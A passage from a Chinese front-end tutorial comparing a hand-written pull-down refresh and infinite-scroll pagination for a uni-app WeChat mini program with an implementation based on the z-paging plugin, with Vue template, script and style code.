mKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一.自己实现</h2>
<h3 data-id="heading-1">1.实现步骤</h3>
<p>微信小程序的页面级下拉刷新依赖：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"enablePullDownRefresh"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>然后在页面写：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">onPullDownRefresh</span>(() =&gt; {
  ...
})

<span class="hljs-built_in">onReachBottom</span>(() =&gt; {
  ...
})

</code></pre>
<h3 data-id="heading-2">2.需要解决的问题</h3>
<ul>
<li>上拉时文字  ''加载中...",  ''没有更多了''的切换</li>
<li>触底时loading的加载</li>
<li>触底判断当前list的长度和后端返回的total长度比较,去判断当前是''加载中''还是''没有更多了''</li>
<li>数据的拼接处理，downloadClassList.value = [...downloadClassList.value, ...res.rows];</li>
<li>下拉加载<code>onPullDownRefresh</code>时需要处理请求页数的问题</li>
</ul>
<h3 data-id="heading-3">3.不足</h3>
<ul>
<li>onPullDownRefresh手机呈现的效果是**“整个页面一起拉下来”**，也就是页面级的。当你页面顶部有搜索框、tabs 等内容时， 微信小程序原生的 <code>enablePullDownRefresh</code> 会一起被下拉，体验很差。</li>
<li>相对复杂，需要自己去实现判断后端的总数据total和数据list长度；来维护hasMore从而控制是否还需要请求，是否需要loading等</li>
</ul>
<h3 data-id="heading-4">4.具体代码示例</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadHistory"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topSearch"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-menu</span> <span class="hljs-attr">active-color</span>=<span class="hljs-string">"#29a1f7"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-item</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">"resourceClass"</span> <span class="hljs-attr">:options</span>=<span class="hljs-string">"option1"</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">"selectClass"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">van-dropdown-menu</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCollection"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"downloadClassList.length !== 0"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCard"</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, key) in downloadClassList"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toDownloadList(item)"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">van-image</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"75"</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.coverUrl"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picInfo"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picTitle"</span>&gt;</span>{{ item.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picNum"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mr-20"</span>&gt;</span>{{ item.videoNum }}视频<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.pictureNum }}图片<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- 加载状态 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"loading-status"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">van-loading</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"loading"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"spinner"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"32rpx"</span>&gt;</span> 加载中... <span class="hljs-tag">&lt;/<span class="hljs-name">van-loading</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">"!hasMore &amp;&amp; downloadClassList.length &gt; 0"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"no-more"</span>&gt;</span> - 没有更多了 - <span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"null-page"</span> <span class="hljs-attr">v-else</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">van-empty</span> <span class="hljs-attr">description</span>=<span class="hljs-string">"暂无数据"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { queryDownload } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/downloadHistory.js'</span>;
<span class="hljs-keyword">import</span> { onShow } <span class="hljs-keyword">from</span> <span class="hljs-string">'@dcloudio/uni-app'</span>;
<span class="hljs-keyword">import</span> { onReachBottom, onPullDownRefresh } <span class="hljs-keyword">from</span> <span class="hljs-string">'@dcloudio/uni-app'</span>;

<span class="hljs-keyword">const</span> resourceClass = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);

<span class="hljs-keyword">const</span> option1 = <span class="hljs-title function_">ref</span>([
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'全部记录'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">''</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'文旅景区'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'scenic'</span> },
  { <span class="hljs-attr">text</span>: <span class="hljs-string">'体育赛事'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'event'</span> },
]);

<span class="hljs-keyword">const</span> page = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 表示下一次要请求的页码，初始请求为 1</span>
<span class="hljs-keyword">const</span> pageSize = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
<span class="hljs-keyword">const</span> hasMore = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">true</span>);
<span class="hljs-keyword">const</span> total = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">const</span> downloadClassList = <span class="hljs-title function_">ref</span>([]);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">selectClass</span>(<span class="hljs-params">event</span>) {
  downloadClassList.<span class="hljs-property">value</span> = [];
  resourceClass.<span class="hljs-property">value</span> = event.<span class="hljs-property">detail</span>;
  <span class="hljs-title function_">loadMore</span>();
}

<span class="hljs-comment">// 前往下载列表</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toDownloadList</span>(<span class="hljs-params">item</span>) {
  uni.<span class="hljs-title function_">navigateTo</span>({
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/downloadList/index'</span>,
    <span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      res.<span class="hljs-property">eventChannel</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'recordFolder'</span>, item);
    },
  });
}

<span class="hljs-comment">// loadMore：refresh 为 true 时表示下拉刷新/重新加载第一页</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-params">refresh = <span class="hljs-literal">false</span></span>) {
  <span class="hljs-comment">// 并发保护（防止重复请求）</span>
  <span class="hljs-keyword">if</span> (loading.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>;
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-keyword">const</span> token = uni.<span class="hljs-title function_">getStorageSync</span>(<span class="hljs-string">'token'</span>);
  <span class="hljs-keyword">if</span> (!token) {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
    uni.<span class="hljs-title function_">navigateTo</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/loginPage/index'</span> });
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (refresh) {
      <span class="hljs-comment">// 请求第一页</span>
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">queryDownload</span>(
        {
          <span class="hljs-attr">originType</span>: resourceClass.<span class="hljs-property">value</span>,
          <span class="hljs-attr">pageNum</span>: <span class="hljs-number">1</span>,
          pageSize,
        },
        token
      );

      <span class="hljs-comment">// 覆盖数据</span>
      downloadClassList.<span class="hljs-property">value</span> = res.<span class="hljs-property">rows</span> || [];
      total.<span class="hljs-property">value</span> = res.<span class="hljs-property">total</span> || (res.<span class="hljs-property">rows</span> ? res.<span class="hljs-property">rows</span>.<span class="hljs-property">length</span> : <span class="hljs-number">0</span>);

      <span class="hljs-comment">// 如果返回的行数小于 pageSize，说明没有更多</span>
      hasMore.<span class="hljs-property">value</span> = downloadClassList.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> &lt; total.<span class="hljs-property">value</span>;

      <span class="hljs-comment">// 重要：refresh 后把 page 设为下一页（2）</span>
      page.<span class="hljs-property">value</span> = <span class="hljs-number">2</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 非刷新场景，请求 page（page 表示下一次要请求的页码）</span>
      <span class="hljs-keyword">if</span> (!hasMore.<span class="hljs-property">value</span>) {
        loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span>;
      }

      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">queryDownload</span>(
        {
          <span class="hljs-attr">originType</span>: resourceClass.<span class="hljs-property">value</span>,
          <span class="hljs-attr">pageNum</span>: page.<span class="hljs-property">value</span>,
          pageSize,
        },
        token
      );

      <span class="hljs-keyword">const</span> rows = res.<span class="hljs-property">rows</span> || [];

      <span class="hljs-comment">// 追加数据</span>
      downloadClassList.<span class="hljs-property">value</span> = [...downloadClassList.<span class="hljs-property">value</span>, ...rows];
      total.<span class="hljs-property">value</span> = res.<span class="hljs-property">total</span> || total.<span class="hljs-property">value</span>;

      <span class="hljs-comment">// 成功追加后，page 自增为下一次要请求的页码</span>
      page.<span class="hljs-property">value</span> = page.<span class="hljs-property">value</span> + <span class="hljs-number">1</span>;

      <span class="hljs-comment">// 如果本次返回的数量 &lt; pageSize 或 当前长度 &gt;= total，则没有更多</span>
      <span class="hljs-keyword">if</span> (rows.<span class="hljs-property">length</span> &lt; pageSize || downloadClassList.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> &gt;= total.<span class="hljs-property">value</span>) {
        hasMore.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
      } <span class="hljs-keyword">else</span> {
        hasMore.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
      }
    }
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'loadMore error'</span>, err);
    <span class="hljs-comment">// 请求失败时不改变 page（避免乱跳），并可视需要设置 hasMore / 显示错误</span>
  } <span class="hljs-keyword">finally</span> {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-comment">// 下拉刷新：调用 loadMore(true)，并等待完成再停止刷新动画</span>
<span class="hljs-title function_">onPullDownRefresh</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">if</span> (loading.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 避免同时下拉和触底并发</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'pull down refresh'</span>);
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-comment">// 结束下拉动画</span>
  uni.<span class="hljs-title function_">stopPullDownRefresh</span>();
});

<span class="hljs-comment">// 触底加载：await loadMore()，并依赖 hasMore 控制</span>
<span class="hljs-title function_">onReachBottom</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-comment">// 防止重复触发</span>
  <span class="hljs-keyword">if</span> (loading.<span class="hljs-property">value</span> || !hasMore.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-literal">false</span>);
});
<span class="hljs-comment">// dom挂载加载一次</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// getDownload();</span>
});
<span class="hljs-comment">// 每次进入页面加载一次</span>
<span class="hljs-title function_">onShow</span>(<span class="hljs-function">() =&gt;</span> {
  downloadClassList.<span class="hljs-property">value</span> = [];
  page.<span class="hljs-property">value</span> = <span class="hljs-number">1</span>;
  <span class="hljs-title function_">loadMore</span>();
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.downloadHistory</span> {
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
}

<span class="hljs-selector-class">.topSearch</span> {
  <span class="hljs-attribute">position</span>: fixed;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">99</span>;
}

<span class="hljs-selector-class">.downloadCollection</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">130</span>rpx;
}

<span class="hljs-selector-class">.downloadCard</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8</span>rpx;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: flex-start;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30</span>rpx;
}

<span class="hljs-selector-class">.downloadCard</span><span class="hljs-selector-pseudo">:last-child</span> {
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;
}

<span class="hljs-selector-class">.picInfo</span> {
  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.picTitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">50</span>rpx;
}

<span class="hljs-selector-class">.picNum</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
}

<span class="hljs-selector-class">.mr-20</span> {
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20</span>rpx;
}

<span class="hljs-selector-class">.loading-status</span> {
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40</span>rpx <span class="hljs-number">0</span>;
}
<span class="hljs-selector-class">.no-more</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">24</span>rpx;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>


</code></pre>
<h2 data-id="heading-5">二.利用插件<code>z-paging</code></h2>
<h3 data-id="heading-6">1.前提</h3>
<ul>
<li>需要"enablePullDownRefresh": false</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pages/downloadHistory/index"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"style"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"navigationBarTitleText"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"下载记录"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"enablePullDownRefresh"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<p><strong>z-paging` 不使用小程序原生下拉刷新，它自己封装了一整套刷新与分页逻辑</strong></p>
<ul>
<li>下拉刷新</li>
<li>上拉加载更多</li>
<li>滚动监听</li>
<li>加载状态管理</li>
<li>空数据提示</li>
<li>自动触底加载</li>
</ul>
<p>所以不需要再用原生的下拉刷新，否则可能会冲突。</p>
<p><strong><code>z-paging</code> 自己监听 <code>scroll-view</code>，不依赖页面能力</strong></p>
<p><code>z-paging </code>通过内部的：</p>
<ul>
<li><code>scroll-view</code></li>
<li><code>custom-refresher</code></li>
<li>自定义“下拉刷新动画”</li>
</ul>
<p>来实现刷新效果，而不是依赖微信提供的页面级 <code>enablePullDownRefresh</code>。</p>
<p>所以用 <code>z-paging</code> 时，<code>pages.json </code>中完全不需要开启此项。</p>
<h3 data-id="heading-7">2.优点</h3>
<ul>
<li>使用简单，采用vue组件的方式，通过<code>props</code> <code>event</code> <code>slot</code>来快速构建</li>
<li><code>z-paging </code>不使用页面的下拉刷新能力（<code>enablePullDownRefresh</code>）</li>
</ul>
<h3 data-id="heading-8">3.实现原理</h3>
<p><code>z-paging </code>使用的是 <strong>组件内部 scroll-view 的下拉刷新能力</strong>， 内部类似这样：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scroll-view</span>
  <span class="hljs-attr">scroll-y</span>
  <span class="hljs-attr">:refresher-enabled</span>=<span class="hljs-string">"useRefresher"</span>
  <span class="hljs-attr">:lower-threshold</span>=<span class="hljs-string">"50"</span>
  @<span class="hljs-attr">refresherrefresh</span>=<span class="hljs-string">"onRefresh"</span>
  @<span class="hljs-attr">scrolltolower</span>=<span class="hljs-string">"onLoadMore"</span>
&gt;</span>
  <span class="hljs-comment">&lt;!-- 顶部 slot --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"top"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- 列表内容 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- loading 动画 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">loading-view</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"loading"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!-- 没有更多 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">no-more</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!hasMore"</span> /&gt;</span>
  
   <span class="hljs-comment">&lt;!-- ...更多插槽 --&gt;</span>
   
<span class="hljs-tag">&lt;/<span class="hljs-name">scroll-view</span>&gt;</span>

</code></pre>
<h3 data-id="heading-9">4.具体代码实现</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadHistory"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCollection"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">z-paging</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"paging"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"dataList"</span> @<span class="hljs-attr">query</span>=<span class="hljs-string">"queryList"</span> <span class="hljs-attr">:default-page-size</span>=<span class="hljs-string">"10"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 需要固定在顶部不滚动的view放在slot="top"的view中，如果需要跟着滚动，则不要设置slot="top" --&gt;</span>
        <span class="hljs-comment">&lt;!-- 注意！此处的z-tabs为独立的组件，可替换为第三方的tabs，若需要使用z-tabs，请在插件市场搜索z-tabs并引入，否则会报插件找不到的错误 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">top</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-menu</span> <span class="hljs-attr">active-color</span>=<span class="hljs-string">"#29a1f7"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">van-dropdown-item</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">"resourceClass"</span> <span class="hljs-attr">:options</span>=<span class="hljs-string">"option1"</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">"selectClass"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">van-dropdown-menu</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 设置自己的empty组件，非必须。空数据时会自动展示空数据组件，不需要自己处理 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">empty</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">van-empty</span> <span class="hljs-attr">description</span>=<span class="hljs-string">"暂无数据"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 自定义的没有更多数据view --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">loadingMoreNoMore</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"no-more"</span>&gt;</span>- 没有更多了 -<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"downloadCard"</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, key) in dataList"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toDownloadList(item)"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">van-image</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"75"</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.coverUrl"</span> /&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picInfo"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picTitle"</span>&gt;</span>{{ item.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"picNum"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mr-20"</span>&gt;</span>{{ item.videoNum }}视频<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ item.pictureNum }}图片<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">z-paging</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { queryDownload } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/downloadHistory.js'</span>;
